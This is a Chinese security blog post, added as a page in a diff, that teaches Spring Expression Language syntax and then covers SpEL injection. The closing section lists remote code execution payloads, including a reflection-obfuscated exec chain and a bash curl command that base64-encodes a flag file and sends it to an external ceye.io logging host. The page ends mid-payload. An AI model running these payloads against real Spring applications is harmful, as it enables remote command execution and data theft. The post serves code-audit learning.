@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/toux.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/toux.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/toux.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/toux.jpg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计,java,SpEL,注入,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="peri0d的博客" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="SpEL 简介 全称为 Spring Expression Language，即 Spring 表达式语言，和 JSP 类似但是强于 JSP  官方文档 : https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html  语法 :   #{...} 大括号内的字符都是 SpEL 表达式，用于引入变量，属性，方法等 ${...">
+<meta name="keywords" content="代码审计,java,SpEL,注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpEL 注入">
+<meta property="og:url" content="http://yoursite.com/2019/07/23/SpEL 注入/index.html">
+<meta property="og:site_name" content="peri0d的博客">
+<meta property="og:description" content="SpEL 简介 全称为 Spring Expression Language，即 Spring 表达式语言，和 JSP 类似但是强于 JSP  官方文档 : https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html  语法 :   #{...} 大括号内的字符都是 SpEL 表达式，用于引入变量，属性，方法等 ${...">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-07-18T16:22:24.288Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SpEL 注入">
+<meta name="twitter:description" content="SpEL 简介 全称为 Spring Expression Language，即 Spring 表达式语言，和 JSP 类似但是强于 JSP  官方文档 : https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html  语法 :   #{...} 大括号内的字符都是 SpEL 表达式，用于引入变量，属性，方法等 ${...">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/23/SpEL 注入/">
+
+
+
+
+
+  <title>SpEL 注入 | peri0d的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">peri0d的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">peri0d</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/23/SpEL 注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="peri0d">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/toux.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="peri0d的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SpEL 注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-23T20:27:52+08:00">
+                2019-07-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SpEL-简介"><a href="#SpEL-简介" class="headerlink" title="SpEL 简介"></a>SpEL 简介</h1><ul>
+<li><p>全称为 Spring Expression Language，即 Spring 表达式语言，和 JSP 类似但是强于 JSP</p>
+</li>
+<li><p>官方文档 : <a href="https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html</a></p>
+</li>
+<li><p>语法 : </p>
+<ul>
+<li><code>#{...}</code> 大括号内的字符都是 SpEL 表达式，用于引入变量，属性，方法等</li>
+<li><code>${...}</code> 大括号内的是属性名</li>
+<li><code>T(Type)</code> 用此表示类实例，返回一个类对象，常用于引入静态常量或者静态方法</li>
+</ul>
+</li>
+<li><p>用法 : </p>
+<ul>
+<li><p>注解在 @value 中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FieldValueTestBean</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">  @Value("#&#123; systemProperties['user.region'] &#125;")</span><br><span class="line">  <span class="keyword">private</span> String defaultLocale;</span><br><span class="line"><span class="comment">// systemProperties['user.region'] 是预先定义好的，赋值给 defaultLocale</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDefaultLocale</span><span class="params">(String defaultLocale)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.defaultLocale = defaultLocale;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getDefaultLocale</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.defaultLocale;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>bean 依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"numberGuess"</span> <span class="attr">class</span>=<span class="string">"org.spring.samples.NumberGuess"</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 相当于将一个随机数乘 100.0 赋值给 randomNumber --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"randomNumber"</span> <span class="attr">value</span>=<span class="string">"#&#123; T(java.lang.Math).random() * 100.0 &#125;"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- other properties --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在代码块中使用 Expression，ExpressionParser 将字符串表达式转换为 Expression 对象，因此，parseExpression 的值将在 EvaluationContext 中可用。此EvaluationContext 将是唯一可以从中访问字符串 EL 中的所有属性和变量的对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析器，解析表达式</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"><span class="comment">// 计算先前定义好的表达式</span></span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">"'Hello World'.concat('!')"</span>);</span><br><span class="line"><span class="comment">// 获取结果 'Hello World!'</span></span><br><span class="line">String message = (String) exp.getValue();</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>变量 : </p>
+<ul>
+<li><code>#bean_id</code> 获取容器内变量</li>
+<li><code>#this</code> 使用当前正在计算的上下文</li>
+<li><code>#root</code> 引用容器的 root 对象</li>
+</ul>
+</li>
+</ul>
+<h1 id="SpEL-表达式"><a href="#SpEL-表达式" class="headerlink" title="SpEL 表达式"></a>SpEL 表达式</h1><ul>
+<li><p>文本表达式 : 支持字符串，日期，数字，布尔和 null</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line"><span class="comment">// evals to "Hello World"</span></span><br><span class="line">String helloWorld = (String) parser.parseExpression(<span class="string">"'Hello World'"</span>).getValue(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> avogadrosNumber  = (Double) parser.parseExpression(<span class="string">"6.0221415E+23"</span>).getValue();  </span><br><span class="line"></span><br><span class="line"><span class="comment">// evals to 2147483647</span></span><br><span class="line"><span class="keyword">int</span> maxValue = (Integer) parser.parseExpression(<span class="string">"0x7FFFFFFF"</span>).getValue();  </span><br><span class="line"></span><br><span class="line"><span class="keyword">boolean</span> trueValue = (Boolean) parser.parseExpression(<span class="string">"true"</span>).getValue();</span><br><span class="line"></span><br><span class="line">Object nullValue = parser.parseExpression(<span class="string">"null"</span>).getValue();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>属性值( Properties )使用 <code>.</code> 来访问，数组( Arrays )和列表( Lists )使用 <code>[]</code> 来获取元素，字典( maps )使用 <code>[]</code> 和 key 访问 value</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evals to 1856</span></span><br><span class="line"><span class="keyword">int</span> year = (Integer) parser.parseExpression(<span class="string">"Birthdate.Year + 1900"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Inventions Array</span></span><br><span class="line">StandardEvaluationContext teslaContext = <span class="keyword">new</span> StandardEvaluationContext(tesla);</span><br><span class="line"><span class="comment">// evaluates to "Induction motor"</span></span><br><span class="line">String invention = parser.parseExpression(<span class="string">"inventions[3]"</span>).getValue(teslaContext, String.class); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Members List</span></span><br><span class="line">StandardEvaluationContext societyContext = <span class="keyword">new</span> StandardEvaluationContext(ieee);</span><br><span class="line"><span class="comment">// evaluates to "Nikola Tesla"</span></span><br><span class="line">String name = parser.parseExpression(<span class="string">"Members[0].Name"</span>).getValue(societyContext, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Officer's Dictionary</span></span><br><span class="line">Inventor pupin = parser.parseExpression(<span class="string">"Officers['president']"</span>).getValue(societyContext, Inventor.class);</span><br><span class="line"><span class="comment">// evaluates to "Idvor"</span></span><br><span class="line">String city = parser.parseExpression(<span class="string">"Officers['president'].PlaceOfBirth.City"</span>).getValue(societyContext, String.class);</span><br><span class="line"><span class="comment">// setting values</span></span><br><span class="line">parser.parseExpression(<span class="string">"Officers['advisors'][0].PlaceOfBirth.Country"</span>).setValue(societyContext, <span class="string">"Croatia"</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>列表( Lists )可以在表达式中直接使用 <code>{}</code> 表达</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evaluates to a Java list containing the four numbers</span></span><br><span class="line">List numbers = (List) parser.parseExpression(<span class="string">"&#123;1,2,3,4&#125;"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line">List listOfLists = (List) parser.parseExpression(<span class="string">"&#123;&#123;'a','b'&#125;,&#123;'x','y'&#125;&#125;"</span>).getValue(context);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数组可以在表达式中直接使用 Java 语法构建，但是多维数组不能手动初始化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] numbers1 = (<span class="keyword">int</span>[]) parser.parseExpression(<span class="string">"new int[4]"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Array with initializer</span></span><br><span class="line"><span class="keyword">int</span>[] numbers2 = (<span class="keyword">int</span>[]) parser.parseExpression(<span class="string">"new int[]&#123;1,2,3&#125;"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Multi dimensional array</span></span><br><span class="line"><span class="keyword">int</span>[][] numbers3 = (<span class="keyword">int</span>[][]) parser.parseExpression(<span class="string">"new int[4][5]"</span>).getValue(context);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Java 函数可以直接在表达式中使用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string literal, evaluates to "bc"</span></span><br><span class="line">String c = parser.parseExpression(<span class="string">"'abc'.substring(2, 3)"</span>).getValue(String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// evaluates to true</span></span><br><span class="line"><span class="keyword">boolean</span> isMember = parser.parseExpression(<span class="string">"isMember('MihajloPupin')"</span>).getValue(societyContext, Boolean.class);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以使用关系运算，逻辑运算和数学运算</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;, &gt;, &lt;=, &gt;=, ==, !=, /, %, !</span><br><span class="line">AND, OR, NOT</span><br><span class="line">+, -, *, /, %, ^</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>赋值可以通过赋值运算符来完成，也可以在 setValue 函数中完成，也可以在 getValue 的调用中完成</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Inventor inventor = <span class="keyword">new</span> Inventor();		</span><br><span class="line">StandardEvaluationContext inventorContext = <span class="keyword">new</span> StandardEvaluationContext(inventor);</span><br><span class="line"></span><br><span class="line">parser.parseExpression(<span class="string">"Name"</span>).setValue(inventorContext, <span class="string">"Alexander Seovic2"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// alternatively( 或者 )</span></span><br><span class="line">String aleks = parser.parseExpression(<span class="string">"Name = 'AlexandarSeovic'"</span>).getValue(inventorContext, String.class);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>T(Type)</code> 可以指定 <code>java.lang.class</code> 的实例，但是对于其他实例，要完全限定</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class dateClass = parser.parseExpression(<span class="string">"T(java.util.Date)"</span>).getValue(Class.class);</span><br><span class="line"></span><br><span class="line">Class stringClass = parser.parseExpression(<span class="string">"T(String)"</span>).getValue(Class.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">boolean</span> trueValue = parser.parseExpression(<span class="string">"T(java.math.RoundingMode).CEILING &lt; T(java.math.RoundingMode).FLOOR"</span>).getValue(Boolean.class);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以使用 <code>new</code> 调用构造函数，但是除了基元类型和字符串（其中可以使用int、float等）之外，所有的类都应该使用完全限定的类名</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Inventor einstein = p.parseExpression(<span class="string">"new org.spring.samples.spel.inventor.Inventor('Albert Einstein', 'German')"</span>).getValue(Inventor.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//create new inventor instance within add method of List</span></span><br><span class="line">p.parseExpression(<span class="string">"Members.add(new org.spring.samples.spel.inventor.Inventor('Albert Einstein', 'German'))"</span>).getValue(societyContext);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>变量可以使用 <code>#变量名</code> 来进行引用，这些变量是在 <code>StandardEvaluationContext</code> 中使用 <code>setVariable</code> 赋值的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Inventor tesla = <span class="keyword">new</span> Inventor(<span class="string">"Nikola Tesla"</span>, <span class="string">"Serbian"</span>);</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(tesla);</span><br><span class="line">context.setVariable(<span class="string">"newName"</span>, <span class="string">"Mike Tesla"</span>);</span><br><span class="line"><span class="comment">// 首字母不区分大小写</span></span><br><span class="line">parser.parseExpression(<span class="string">"Name = #newName"</span>).getValue(context);</span><br><span class="line"></span><br><span class="line">System.out.println(tesla.getName()) <span class="comment">// "Mike Tesla"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用 <code>#root</code> 引用根对象，使用 <code>#this</code> 引用当前上下文对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create an array of integers</span></span><br><span class="line">List&lt;Integer&gt; primes = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">primes.addAll(Arrays.asList(<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// create parser and set variable 'primes' as the array of integers</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setVariable(<span class="string">"primes"</span>,primes);</span><br><span class="line"></span><br><span class="line"><span class="comment">// all prime numbers &gt; 10 from the list (using selection ?&#123;...&#125;)</span></span><br><span class="line"><span class="comment">// evaluates to [11, 13, 17]</span></span><br><span class="line">List&lt;Integer&gt; primesGreaterThanTen = (List&lt;Integer&gt;) parser.parseExpression(<span class="string">"#primes.?[#this&gt;10]"</span>).getValue(context);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过使用 <code>StandardEvaluationContext</code> 中的 <code>registerFunction(String name, Method m)</code> 函数来自定义函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">StringUtils</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverseString</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">    StringBuilder backwards = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length(); i++) </span><br><span class="line">      backwards.append(input.charAt(input.length() - <span class="number">1</span> - i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> backwards.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.registerFunction(<span class="string">"reverseString"</span>, StringUtils.class.getDeclaredMethod(<span class="string">"reverseString"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;));</span><br><span class="line"></span><br><span class="line">String helloWorldReversed = parser.parseExpression(<span class="string">"#reverseString('hello')"</span>).getValue(context, String.class);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果已使用 Bean 解析器配置了上下文，可以使用 <code>@</code> 获取 Bean</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setBeanResolver(<span class="keyword">new</span> MyBeanResolver());</span><br><span class="line"></span><br><span class="line"><span class="comment">// This will end up calling resolve(context,"foo") on MyBeanResolver during evaluation</span></span><br><span class="line">Object bean = parser.parseExpression(<span class="string">"@foo"</span>).getValue(context);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>表达式允许多个文本和解析块混合使用，常以 <code>#{}</code> 作为分界符</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String randomPhrase = parser.parseExpression(<span class="string">"random number is #&#123;T(java.lang.Math).random()&#125;"</span>, <span class="keyword">new</span> TemplateParserContext()).getValue(String.class);</span><br><span class="line"><span class="comment">// evaluates to "random number is 0.7038186818312008"</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="SpEL-中的-RCE"><a href="#SpEL-中的-RCE" class="headerlink" title="SpEL 中的 RCE"></a>SpEL 中的 RCE</h1><ul>
+<li><p>SpEL 有两种 EvaluationContext，StandardEcalutionContext 和 SimpleEvaluationContext</p>
+</li>
+<li><p>两种 EvaluationContext 的区别 : </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String calc = <span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>;</span><br><span class="line"></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line">StandardEvaluationContext std_danger = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">EvaluationContext simple_safe = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</span><br><span class="line"></span><br><span class="line">Expression exp = parser.parseExpression(calc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行命令</span></span><br><span class="line">Object value_1 = exp.getValue(std_danger);</span><br><span class="line"><span class="comment">//报错</span></span><br><span class="line">Object value_2 = exp.getValue(simple_safe);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在不指定 <code>EvaluationContext</code> 时，默认采用的是 <code>StandardEvaluationContext</code>，例如 Spring Data Commons 远程代码执行漏洞_CVE-2018-1273( 1.13-1.13.10, 2.0-2.0.5 )，SpringBoot SpEL表达式注入漏洞( 1.1.0-1.1.12, 1.2.0-1.2.7, 1.3.0 )，</p>
+</li>
+<li><p>payload : </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://rui0.cn/archives/1043</span></span><br><span class="line"></span><br><span class="line">$&#123;<span class="number">12</span>*<span class="number">12</span>&#125;</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">"nslookup a.com"</span>)</span><br><span class="line">T(Thread).sleep(<span class="number">10000</span>)</span><br><span class="line">#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')</span><br><span class="line"><span class="keyword">new</span> java.lang.ProcessBuilder(&#123;<span class="string">'nslookup a.com'</span>&#125;).start()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用反射构造</span></span><br><span class="line">#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"/bin/bash","-c","curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr '\n' 